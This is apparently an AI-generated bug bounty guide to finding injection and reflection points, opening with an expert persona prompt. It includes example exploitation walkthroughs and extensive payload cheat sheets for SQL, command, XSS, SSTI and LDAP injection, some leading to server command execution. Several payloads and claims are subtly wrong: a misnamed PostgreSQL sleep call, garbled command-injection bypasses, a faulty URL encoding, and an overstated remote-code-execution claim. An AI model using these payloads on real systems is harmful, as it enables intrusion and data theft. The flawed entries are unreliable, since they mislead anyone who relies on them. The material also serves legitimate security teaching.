# To Identify Injection and Reflected Point During Testing — Bug Bounty Support Guide

## Expert Role

You are a specialist in identifying injection vulnerabilities and reflection points in web applications. Your expertise lies in understanding how user input flows through an application, where it is processed, and how it can be manipulated to execute unintended commands or reveal sensitive information. You have deep knowledge of injection attack vectors across multiple technologies and frameworks, including SQL, NoSQL, command, LDAP, XPath, and template injection. You also understand reflection points—places where user input is echoed back to the user—and how these can be leveraged for cross-site scripting (XSS) and other client-side attacks.

Your methodology is systematic and thorough. You don't just test individual parameters—you trace the complete data flow from input to output, understanding how the application processes and transforms user data at each stage. You know that injection vulnerabilities often exist in unexpected places, such as in error messages, log files, or secondary processing steps that don't appear in the primary application flow. You approach each target with a comprehensive testing strategy that covers all possible injection points and reflection patterns.

You are also deeply familiar with the evolving landscape of injection attacks. You understand how modern frameworks and security controls attempt to prevent injection, and you know the bypass techniques that can circumvent these protections. You stay current with new injection classes and exploitation techniques, and you continuously update your testing methodology to reflect the current state of application security. Your goal is to find injection vulnerabilities that matter—ones that have real impact and can be reliably exploited.

## Overview

Injection vulnerabilities remain one of the most critical classes of web application security flaws. They occur when untrusted user input is incorporated into commands, queries, or code executed by the application. The impact of injection vulnerabilities ranges from information disclosure to complete system compromise, depending on the vulnerability type and the application's architecture.

Reflection points are locations where user input is echoed back to the user in the application's response. While reflection points are not vulnerabilities themselves, they are essential components of many attack chains, particularly XSS attacks. Understanding how and where user input is reflected helps identify potential XSS vulnerabilities and develop effective exploitation techniques.

This guide provides a comprehensive framework for identifying injection vulnerabilities and reflection points in web applications. We cover the methodology for systematically testing for injection, techniques for tracing data flow through applications, and strategies for developing reliable exploitation techniques. We also include real-world examples that demonstrate how injection vulnerabilities and reflection points can be identified and exploited in practice.

---

## Core Concepts

### Injection Attack Vectors

Injection attacks exploit the application's failure to properly separate user input from commands or code. The most common injection attack vectors include:

**SQL Injection**: Exploiting vulnerabilities in SQL query construction to execute arbitrary SQL commands. This can lead to data exfiltration, authentication bypass, or even remote code execution in some cases.

**Command Injection**: Exploiting vulnerabilities in system command execution to run arbitrary commands on the server. This can lead to complete system compromise if the application runs with sufficient privileges.

**NoSQL Injection**: Similar to SQL injection but targeting NoSQL databases like MongoDB. Often involves manipulating JSON operators to bypass authentication or extract data.

**LDAP Injection**: Exploiting vulnerabilities in LDAP query construction to manipulate directory service queries.

**XPath Injection**: Exploiting vulnerabilities in XPath query construction to manipulate XML document queries.

**Template Injection (SSTI)**: Exploiting vulnerabilities in server-side template engines to execute arbitrary code.

**Expression Language Injection**: Exploiting vulnerabilities in expression language evaluation, common in Java-based applications.

### Reflection Points

Reflection points are locations where user input appears in the application's response. Understanding reflection points is essential for identifying XSS vulnerabilities:

**Reflected Parameters**: Parameters that are directly echoed in the response, often in error messages or search results.

**Stored Reflections**: Input that is stored and later displayed, potentially affecting multiple users.

**DOM-Based Reflections**: Input that is processed by client-side JavaScript and reflected in the DOM.

**HTTP Header Reflection**: Input that appears in HTTP response headers, potentially enabling header injection attacks.

**File Name Reflection**: Uploaded file names that are reflected in the response.

**Error Message Reflection**: Input that triggers error messages containing the original input.

### Data Flow Analysis

Understanding how data flows through the application helps identify injection points:

**Sources**: Locations where user input enters the application (form fields, URL parameters, headers, cookies).

**Sinks**: Locations where data is used in dangerous operations (database queries, system commands, template rendering).

**Transformations**: How the application modifies data between sources and sinks (encoding, escaping, validation).

**Sanitization**: Security controls applied to user input to prevent injection attacks.

### Injection Detection Patterns

Each injection type has characteristic detection patterns:

**SQL Injection**: Database errors, time delays, boolean-based inference, UNION-based extraction.

**Command Injection**: Command output in responses, time delays, blind injection via boolean conditions.

**XSS**: Script execution in browser, alert dialogs, DOM manipulation.

**SSTI**: Template errors, mathematical evaluation (e.g., `{{7*7}}` = 49).

### Common Encoding and Bypass Techniques

Attackers use various encoding and bypass techniques to evade security controls:

**URL Encoding**: `%27` for single quote, `%3C%3E` for angle brackets.

**HTML Encoding**: `&#60;` for `<`, `&#62;` for `>`.

**Unicode Encoding**: `\u0027` for single quote, `\u003C` for `<`.

**Double Encoding**: `%2527` for `%27`.

**Null Byte Injection**: `%00` to terminate strings in some contexts.

---

## Methodology

### Step 1: Map Input Points

Identify all locations where user input enters the application:

```bash
# Discover form fields
curl -s https://target.com | grep -i "input\|textarea\|select" | grep -i "name="

# Discover URL parameters
curl -s https://target.com | grep -oP '[?&][^=]+=' | sort -u

# Discover HTTP headers that might be reflected
curl -s -D- https://target.com | grep -i "x-forwarded\|referer\|user-agent"

# Discover cookie input points
curl -s -b "test=1" https://target.com | grep -i "test"
```

### Step 2: Test for Reflection

Test each input point for reflection in the response:

```bash
# Test URL parameters for reflection
curl "https://target.com/page?param=TESTMARKER" | grep -i "testmarker"

# Test form fields for reflection
curl -d "field=TESTMARKER" https://target.com/form | grep -i "testmarker"

# Test HTTP headers for reflection
curl -H "X-Custom: TESTMARKER" https://target.com | grep -i "testmarker"

# Test cookies for reflection
curl -b "session=TESTMARKER" https://target.com | grep -i "testmarker"
```

### Step 3: Analyze Reflection Context

Determine how reflected input is processed:

```bash
# Check if reflection is in HTML context
curl "https://target.com/page?q=TESTMARKER" | grep -oP '.{0,50}TESTMARKER.{0,50}'

# Check if reflection is in JavaScript context
curl "https://target.com/page?q=TESTMARKER" | grep -oP 'script.{0,100}TESTMARKER.{0,100}'

# Check if reflection is in attribute context
curl "https://target.com/page?q=TESTMARKER" | grep -oP 'attribute=".{0,50}TESTMARKER.{0,50}"'

# Check if reflection is in URL context
curl "https://target.com/page?q=TESTMARKER" | grep -oP 'href=".{0,50}TESTMARKER.{0,50}"'
```

### Step 4: Test for Injection

Test each input point for injection vulnerabilities:

```bash
# Test for SQL injection
curl "https://target.com/page?id=1'" | grep -i "error\|syntax\|mysql\|sql"

# Test for command injection
curl "https://target.com/api/cmd?input=test%0a'id'" | grep -i "uid\|gid"

# Test for XSS
curl "https://target.com/page?q=<script>alert(1)</script>" | grep -i "<script>"

# Test for SSTI
curl "https://target.com/page?name={{7*7}}" | grep -i "49"
```

### Step 5: Trace Data Flow

Trace how user input flows through the application:

```bash
# Use browser developer tools to observe network requests
# Identify how input is processed and where it appears

# Use proxy tools to intercept and modify requests
# Observe how the application handles modified input

# Use static analysis to understand code logic
# Identify where input is processed and how it's used
```

### Step 6: Develop Exploitation Techniques

Develop reliable exploitation techniques for confirmed vulnerabilities:

```bash
# For SQL injection, develop extraction queries
# For XSS, develop payloads that bypass filters
# For command injection, develop command execution payloads
# For SSTI, develop RCE payloads for the specific template engine
```

### Step 7: Document Findings

Document all findings with clear reproduction steps and impact analysis:

```bash
# Record all input points tested
# Document reflection points found
# Record injection vulnerabilities confirmed
# Include exploitation techniques and payloads used
# Assess impact and provide remediation guidance
```

---

## Real-World Examples

### Example 1: SQL Injection via Search Parameter

**Scenario**: A researcher discovered that the search functionality on a content management system was vulnerable to SQL injection, allowing extraction of sensitive data from the database.

**Input Point Discovery**:
```
GET /search?q=test HTTP/1.1
Host: cms.example.com

Form analysis revealed a search input field that submits to the /search endpoint.
```

**Reflection Analysis**:
```
GET /search?q=test HTTP/1.1
Host: cms.example.com

Response:
<div class="search-results">
  <p>Your search for "test" returned 5 results.</p>
</div>
```

The search term is reflected in the response within HTML context.

**Injection Testing**:
```
GET /search?q=test' HTTP/1.1
Host: cms.example.com

Response:
<div class="search-results">
  <p>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version</p>
</div>
```

The database error indicates SQL injection vulnerability.

**Exploitation**:
```
GET /search?q=test' UNION SELECT username,password FROM users-- HTTP/1.1
Host: cms.example.com

Response:
<div class="search-results">
  <p>Your search for "test' UNION SELECT username,password FROM users--" returned 10 results.</p>
  <p>admin:$2y$10$...</p>
  <p>user1:$2y$10$...</p>
</div>
```

**Impact**: Complete database compromise, including extraction of user credentials.

### Example 2: Reflected XSS via Error Message

**Scenario**: A researcher found that user input was reflected in error messages without proper encoding, leading to a reflected XSS vulnerability.

**Input Point Discovery**:
```
POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

**Reflection Analysis**:
```
POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=test&password=wrong

Response:
<div class="error">
  <p>Login failed for user "test". Please check your credentials.</p>
</div>
```

The username is reflected in the error message.

**Injection Testing**:
```
POST /login HTTP/1.1
Host: app.example.com
Content-Type: application/x-www-form-urlencoded

username=<script>alert(1)</script>&password=wrong

Response:
<div class="error">
  <p>Login failed for user "<script>alert(1)</script>". Please check your credentials.</p>
</div>
```

The script tag is reflected without encoding, indicating XSS vulnerability.

**Impact**: An attacker could craft a malicious link that executes JavaScript in the victim's browser when they attempt to log in with the crafted username.

### Example 3: Command Injection via Ping Utility

**Scenario**: A researcher discovered that a network diagnostic tool was vulnerable to command injection, allowing arbitrary command execution on the server.

**Input Point Discovery**:
```
POST /api/ping HTTP/1.1
Host: network.example.com
Content-Type: application/json

{"host":"127.0.0.1"}
```

**Injection Testing**:
```
POST /api/ping HTTP/1.1
Host: network.example.com
Content-Type: application/json

{"host":"127.0.0.1%0aid"}

Response:
{
  "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.028 ms\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
}
```

The newline character and command injection resulted in command execution.

**Impact**: Complete system compromise by executing arbitrary commands on the server.

### Example 4: SSTI via User Profile Name

**Scenario**: A researcher found that user-supplied names were processed by a server-side template engine, leading to server-side template injection.

**Input Point Discovery**:
```
PUT /api/profile HTTP/1.1
Host: app.example.com
Content-Type: application/json
Authorization: Bearer [token]

{"name":"test"}
```

**Injection Testing**:
```
PUT /api/profile HTTP/1.1
Host: app.example.com
Content-Type: application/json
Authorization: Bearer [token]

{"name":"{{7*7}}"}

Response:
{
  "name": "49",
  "profile_url": "/profile/49"
}
```

The mathematical expression was evaluated, indicating template injection.

**Exploitation**:
```
PUT /api/profile HTTP/1.1
Host: app.example.com
Content-Type: application/json
Authorization: Bearer [token]

{"name":"{{config.items()}}"}

Response:
{
  "name": "[('SECRET_KEY', 'supersecretkey'), ('DEBUG', True), ...]",
  "profile_url": "/profile/[('SECRET_KEY', 'supersecretkey'), ('DEBUG', True), ...]"
}
```

**Impact**: Remote code execution through template injection, allowing complete system compromise.

### Example 5: LDAP Injection via Login Form

**Scenario**: A researcher discovered that the login form was vulnerable to LDAP injection, allowing authentication bypass.

**Input Point Discovery**:
```
POST /login HTTP/1.1
Host: corporate.example.com
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

**Injection Testing**:
```
POST /login HTTP/1.1
Host: corporate.example.com
Content-Type: application/x-www-form-urlencoded

username=*)(uid=*))(|(uid=*&password=anything

Response:
302 Found
Location: /dashboard
```

The login succeeded with the injected LDAP query.

**Impact**: Authentication bypass, allowing access to any account without knowing the password.

---

## Advanced Techniques

### Technique 1: Blind Injection Detection

When injection vulnerabilities don't produce visible errors, use time-based or inference-based techniques:

```bash
# Time-based SQL injection
# If the database sleeps when the condition is true, you can infer data
curl "https://target.com/page?id=1' AND SLEEP(5)--"

# Boolean-based blind injection
# Compare responses for true and false conditions
curl "https://target.com/page?id=1' AND 1=1--"  # True condition
curl "https://target.com/page?id=1' AND 1=2--"  # False condition
```

### Technique 2: Second-Order Injection

Some injection vulnerabilities only manifest when the injected data is used in a different context:

```
1. Inject payload during registration (stored in database)
2. Payload triggers when displayed in admin panel
3. Admin panel doesn't properly sanitize data from database
```

### Technique 3: Polyglot Payloads

Polyglot payloads work across multiple injection contexts:

```bash
# XSS polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

# SQL injection polyglot
' OR '1'='1' /*

# Command injection polyglot
; ls #
```

### Technique 4: Encoding Bypass Techniques

Use various encoding techniques to bypass security controls:

```bash
# URL encoding
%27 for single quote
%3C%3Escript%3C/script%3E for <script></script>

# Double encoding
%2527 for %27

# Unicode encoding
\u0027 for single quote
\u003C for <

# HTML encoding
&#60; for <
&#62; for >
```

### Technique 5: Differential Analysis

Compare responses to different inputs to identify injection points:

```bash
# Send different inputs and compare responses
curl "https://target.com/page?id=1" > response1.txt
curl "https://target.com/page?id=2" > response2.txt
diff response1.txt response2.txt

# Analyze differences to identify injection points
```

---

## Common Pitfalls

### Pitfall 1: Only Testing GET Parameters

**Mistake**: Only testing URL parameters and ignoring POST data, headers, and cookies.

**Reality**: Injection vulnerabilities can exist in any user input, including POST data, HTTP headers, cookies, and file uploads. Test all input vectors.

### Pitfall 2: Not Testing Edge Cases

**Mistake**: Only testing obvious injection payloads and not exploring edge cases.

**Reality**: Many vulnerabilities exist in error conditions, boundary cases, and unusual input scenarios. Always test with unexpected inputs and conditions.

### Pitfall 3: Ignoring Second-Order Injection

**Mistake**: Only testing for first-order injection and not considering second-order attacks.

**Reality**: Some injection vulnerabilities only manifest when the injected data is used in a different context. Consider the complete data flow.

### Pitfall 4: Not Understanding the Technology Stack

**Mistake**: Testing without understanding the underlying technology.

**Reality**: Different frameworks and libraries have different vulnerability patterns. Understanding the technology stack helps identify likely injection points.

### Pitfall 5: Giving Up Too Early

**Mistake**: Moving to a different parameter after a few minutes without finding vulnerabilities.

**Reality**: Deep injection hunting requires patience and persistence. Some of the most valuable findings come from extended engagement with a target.

### Pitfall 6: Not Documenting Negative Results

**Mistake**: Only documenting successful findings and not recording what was tested.

**Reality**: Documenting negative results helps avoid duplicate testing and provides context for future research.

### Pitfall 7: Not Validating Findings

**Mistake**: Assuming a vulnerability exists without confirming it through exploitation.

**Reality**: Always validate findings through exploitation to ensure they are real and not false positives.

---

## Tools and Resources

### Injection Testing Tools

**SQLMap**: Automatic SQL injection testing tool.

**Commix**: Automated command injection testing tool.

**NoSQLMap**: Automated NoSQL injection testing tool.

**XSStrike**: Advanced XSS detection and exploitation suite.

**Dalfox**: Open-source parameter analysis and XSS scanner.

### Reflection Detection Tools

**Burp Suite**: Comprehensive web application security testing tool with reflection detection.

**OWASP ZAP**: Free and open-source web application security scanner.

**DirBuster**: Directory and file brute-forcing tool.

**ffuf**: Fast web fuzzer for endpoint discovery.

### Data Flow Analysis Tools

**Semgrep**: Fast, open-source static analysis tool with custom rule support.

**CodeQL**: GitHub's semantic code analysis engine.

**Checkmarx**: Enterprise static application security testing platform.

### Learning Resources

**OWASP Testing Guide**: Comprehensive web application security testing methodology.

**PortSwigger Web Security Academy**: Free online web security training.

**HackTricks**: Comprehensive guide to web application security techniques.

**SQL Injection Knowledge Base**: Comprehensive guide to SQL injection techniques.

---

## Quick Reference Cheat Sheet

### Injection Detection Patterns

| Injection Type | Detection Pattern | Common Payloads |
|---------------|-------------------|-----------------|
| SQL Injection | Database errors, time delays | `' OR '1'='1`, `UNION SELECT` |
| Command Injection | Command output, time delays | `; ls`, `\| cat /etc/passwd` |
| XSS | Script execution, alert boxes | `<script>alert(1)</script>` |
| SSTI | Template errors, math evaluation | `{{7*7}}`, `${7*7}` |
| LDAP Injection | Authentication bypass | `*)(uid=*))(|(uid=*` |
| XPath Injection | XML parsing errors | `' or '1'='1` |

### Reflection Point Detection

```bash
# Test for reflection in HTML context
curl "https://target.com/page?q=TESTMARKER" | grep -i "testmarker"

# Test for reflection in JavaScript context
curl "https://target.com/page?q=TESTMARKER" | grep -oP 'script.{0,100}TESTMARKER.{0,100}'

# Test for reflection in attribute context
curl "https://target.com/page?q=TESTMARKER" | grep -oP 'attribute=".{0,50}TESTMARKER.{0,50}"'

# Test for reflection in URL context
curl "https://target.com/page?q=TESTMARKER" | grep -oP 'href=".{0,50}TESTMARKER.{0,50}"'
```

### Testing Checklist

- [ ] Map all input points (GET, POST, headers, cookies, file uploads)
- [ ] Test each input point for reflection
- [ ] Analyze reflection context (HTML, JavaScript, attribute, URL)
- [ ] Test for injection vulnerabilities (SQL, command, XSS, SSTI)
- [ ] Test for blind injection (time-based, boolean-based)
- [ ] Trace data flow through the application
- [ ] Develop exploitation techniques
- [ ] Validate findings through exploitation
- [ ] Document all findings with reproduction steps

### Common Injection Payloads

**SQL Injection**:
```
' OR '1'='1
' UNION SELECT NULL--
' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**Command Injection**:
```
; ls
| cat /etc/passwd
`id`
$(id)
```

**XSS**:
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

**SSTI**:
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

**LDAP Injection**:
```
*)(uid=*))(|(uid=*
admin)(&)
*)(|(password=*)
```

**XPath Injection**:
```
' or '1'='1
' or '1'='1' --
<node>text</node>
```

### Encoding Reference

| Character | URL Encoding | HTML Encoding | Unicode |
|-----------|-------------|---------------|---------|
| `<` | %3C | &#60; | \u003C |
| `>` | %3E | &#62; | \u003E |
| `'` | %27 | &#39; | \u0027 |
| `"` | %22 | &#34; | \u0022 |
| `&` | %26 | &#38; | \u0026 |
| `/` | %2F | &#47; | \u002F |

### Severity Classification

- **Critical**: Remote code execution via injection, SQL injection with data exfiltration
- **High**: Authentication bypass, stored XSS, SSRF to internal
- **Medium**: Reflected XSS, blind injection, information disclosure
- **Low**: Limited injection impact, verbose error messages

### Quick Testing Commands

```bash
# Test for SQL injection
curl "https://target.com/page?id=1'"

# Test for command injection
curl "https://target.com/api/cmd?input=test%0a'id'"

# Test for XSS
curl "https://target.com/page?q=<script>alert(1)</script>"

# Test for SSTI
curl "https://target.com/page?name={{7*7}}"

# Test for reflection
curl "https://target.com/page?q=TESTMARKER" | grep -i "testmarker"
```

### Platform-Specific Testing Notes

**HackerOne**: Focus on vulnerabilities with clear impact. Document all steps thoroughly.

**Bugcrowd**: Map findings to VRT categories. Include severity justification.

**Intigriti**: Be creative with exploitation chains. Document novel techniques.

**Immunefi**: Focus on smart contract vulnerabilities. Include financial impact calculations.

### Pre-Submission Checklist

1. **Validation**: Vulnerability reproduces consistently
2. **Scope**: Affected endpoint/domain is in scope
3. **Duplicates**: Checked existing reports for duplicates
4. **Severity**: Accurately assessed with CVSS 3.1
5. **Impact**: Clearly articulated business risk
6. **Steps**: Complete and reproducible
7. **PoC**: Included and minimal
8. **Remediation**: Specific and actionable
9. **Formatting**: Follows platform guidelines
10. **Review**: Proofread for errors and clarity

### Injection Testing Methodology Deep Dive

#### Systematic Injection Testing Approach

**Step 1: Input Point Discovery**
```bash
# Discover all input points through crawling
gospider -s https://target.com -d 3 --other-source -c 10 -o crawl_results.txt

# Extract parameters from URLs
cat crawl_results.txt | grep -oP 'https?://[^?]+\?[^ ]+' | sort -u

# Identify form fields
curl -s https://target.com | grep -i "input\|textarea\|select" | grep -i "name="

# Check for hidden parameters
arjun -u https://target.com -o params.txt
```

**Step 2: Reflection Analysis**
```bash
# Test each parameter for reflection
while IFS= read -r param; do
  curl -s "https://target.com/page?$param=TESTMARKER" | grep -i "testmarker" && echo "Reflection in $param"
done < params.txt

# Analyze reflection context
for param in $(cat params.txt); do
  curl -s "https://target.com/page?$param=TESTMARKER" | grep -oP '.{0,50}TESTMARKER.{0,50}'
done
```

**Step 3: Injection Testing**
```bash
# SQL injection testing
while IFS= read -r param; do
  sqlmap -u "https://target.com/page?$param=1" --batch --risk=3 --level=5
done < params.txt

# XSS testing
while IFS= read -r param; do
  curl -s "https://target.com/page?$param=<script>alert(1)</script>" | grep -i "<script>"
done < params.txt

# Command injection testing
while IFS= read -r param; do
  curl -s "https://target.com/page?$param=test%0a'id'" | grep -i "uid\|gid"
done < params.txt
```

#### Advanced Reflection Analysis Techniques

**Technique 1: Multi-Context Reflection Testing**
```bash
# Test reflection in different contexts
# HTML Context
curl "https://target.com/page?q=<div>TEST</div>" | grep -i "<div>test</div>"

# JavaScript Context
curl "https://target.com/page?q=;alert(1)//" | grep -i ";alert(1)//"

# Attribute Context
curl "https://target.com/page?q=\" onmouseover=\"alert(1)" | grep -i "onmouseover"

# URL Context
curl "https://target.com/page?q=javascript:alert(1)" | grep -i "javascript:alert(1)"
```

**Technique 2: DOM-Based Reflection Analysis**
```javascript
// Analyze JavaScript for dangerous sinks
// innerHTML, outerHTML, document.write, eval, setTimeout, setInterval

// Use browser developer tools to trace DOM manipulation
// Set breakpoints in JavaScript execution
// Monitor DOM changes in real-time
```

**Technique 3: Header Reflection Analysis**
```bash
# Test HTTP header reflection
curl -H "X-Forwarded-For: TESTMARKER" https://target.com | grep -i "testmarker"
curl -H "Referer: TESTMARKER" https://target.com | grep -i "testmarker"
curl -H "User-Agent: TESTMARKER" https://target.com | grep -i "testmarker"

# Test for header injection
curl -H "X-Injected: header" https://target.com | grep -i "x-injected"
```

#### Injection Payload Optimization

**SQL Injection Payload Optimization**:
```bash
# Time-based payloads for different databases
# MySQL
test' AND SLEEP(5)--
test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# PostgreSQL
test'; SELECT pg_sleep(5)--
test'; SELECT sleep(5)--

# MSSQL
test'; WAITFOR DELAY '0:0:5'--
test'; EXEC xp_cmdshell('ping 5s')--

# Oracle
test' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

**XSS Payload Optimization**:
```bash
# Basic payloads
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Filter bypass payloads
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>alert(1)//
<script>al\u0065rt(1)</script>
<script>eval(atob('YWxlcnQoMSk='))</script>

# Context-specific payloads
" onmouseover="alert(1)"
' onfocus='alert(1)' autofocus='
javascript:alert(1)
```

**Command Injection Payload Optimization**:
```bash
# Basic payloads
; id
| id
`id`
$(id)

# Time-based payloads
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)

# Filter bypass payloads
; i'd
| i""d
`id```
$(id)
```

**SSTI Payload Optimization**:
```bash
# Basic payloads
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}

# Engine-specific payloads
# Jinja2
{{config}}
{{self.__class__.__mro__}}

# Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Injection Testing Checklist

**Pre-Testing**:
- [ ] Map all input points (GET, POST, headers, cookies, file uploads)
- [ ] Identify technology stack and frameworks
- [ ] Review application architecture
- [ ] Set up testing environment
- [ ] Prepare testing tools and payloads

**Reflection Testing**:
- [ ] Test each input point for reflection
- [ ] Analyze reflection context (HTML, JavaScript, attribute, URL)
- [ ] Identify reflection encoding
- [ ] Test for DOM-based reflection
- [ ] Document all reflection points

**Injection Testing**:
- [ ] Test for SQL injection (all databases)
- [ ] Test for XSS (all contexts)
- [ ] Test for command injection
- [ ] Test for SSTI (all template engines)
- [ ] Test for LDAP injection
- [ ] Test for XPath injection
- [ ] Test for NoSQL injection
- [ ] Test for template injection

**Blind Injection Testing**:
- [ ] Test for time-based blind injection
- [ ] Test for boolean-based blind injection
- [ ] Test for out-of-band injection
- [ ] Test for error-based injection

**Exploitation Testing**:
- [ ] Develop reliable exploitation payloads
- [ ] Test filter bypass techniques
- [ ] Validate exploitation in different contexts
- [ ] Document exploitation techniques

### Injection Testing Resources

**Learning Resources**:
- PortSwigger Web Security Academy
- OWASP Testing Guide
- HackTricks
- PayloadsAllTheThings

**Tool Resources**:
- SQLMap tamper scripts
- XSStrike payloads
- Commix payloads
- Nuclei templates

**Community Resources**:
- Bug bounty reports
- Security research papers
- Vulnerability databases
- Security conferences
